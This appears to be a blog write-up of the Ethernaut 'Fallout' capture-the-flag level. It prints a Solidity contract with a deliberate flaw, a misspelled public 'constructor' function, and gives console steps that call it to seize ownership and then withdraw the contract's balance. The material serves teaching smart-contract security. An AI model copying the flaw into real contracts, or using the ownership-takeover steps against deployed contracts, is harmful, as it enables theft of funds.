---
layout: post
title: Ethernaut - 2.Fallout
date:  2022-08-24
tags: ethernaut
---

### Difficulty: 🌕🌑🌑🌑🌑
### Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

### Writeup
1. Get new instance
2. `await contract.owner()` to check contract owner, it return address 0x0000000000000000000000000000000000000000.
3. Use `await contract.allocatorBalance(YOUR_ADDRESS).then(v=>v.toString())` to check balance, it return zero.
4. `await contract.Fal1out({ value: toWei("0.00001") })`
5. Call function `allovatorBalance` again like step3, we can see out balance become 10000000000000 now.
6. `await contract.collectAllocations()`
7. Submit instance ξ( ✿＞◡❛)